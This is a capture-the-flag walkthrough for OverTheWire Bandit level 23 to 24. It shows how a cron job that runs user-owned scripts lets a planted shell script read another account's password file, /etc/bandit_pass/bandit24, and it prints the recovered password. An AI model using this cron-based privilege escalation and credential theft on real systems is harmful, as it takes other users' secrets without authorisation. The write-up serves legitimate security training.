# Level 23 - Level 24: Bandit - OverTheWire

## Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution
In `/etc/cron.d/cronjob_bandit24`, there is a cron job that runs every minute, executing `cronjob_bandit24.sh`, run by user `bandit24`. If we look at that script, we can see it first executes any executable scripts in the `/foo` folder that user `bandit23` owns. Then, it deletes all files in the `/var/spool/bandit24/foo` directory.

Essentially, we can take advantage of this by getting the `bandit24` user to execute any script on our behalf. Simply use `vi` to create a `.sh` script that reads the file in `/etc/bandit_pass/bandit24` and outputs it (`>`) to a file in the writable `/tmp` directory.

From there, we just need to wait a minute for the cron job to run, and then we will be able to `cat` the new file that was created, containing the password.

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done


bandit23@bandit:~$ vi /var/spool/bandit24/foo/gottem.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/gottem

bandit23@bandit:~$ cat /tmp/gottem
cat: /tmp/gottem: No such file or directory
bandit23@bandit:~$ cat /tmp/gottem
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```